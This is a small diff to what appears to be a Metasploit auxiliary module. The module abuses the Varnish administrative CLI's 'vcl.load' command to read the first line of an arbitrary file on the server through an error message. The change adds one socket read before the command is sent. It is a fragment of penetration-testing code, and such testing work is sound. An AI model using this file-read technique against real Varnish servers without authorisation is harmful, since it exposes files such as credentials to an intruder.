@@ -59,6 +59,7 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
       # abuse vcl.load to load a varnish config file and save it to a random variable.  This will fail to give us the first line in debug message
+      sock.get_once
       sock.puts("vcl.load #{Rex::Text.rand_text_alphanumeric(3)} #{datastore['FILE']}")
       result = sock.get_once
       if result && result =~ /Line \d Pos \d+\)\n(.*)/
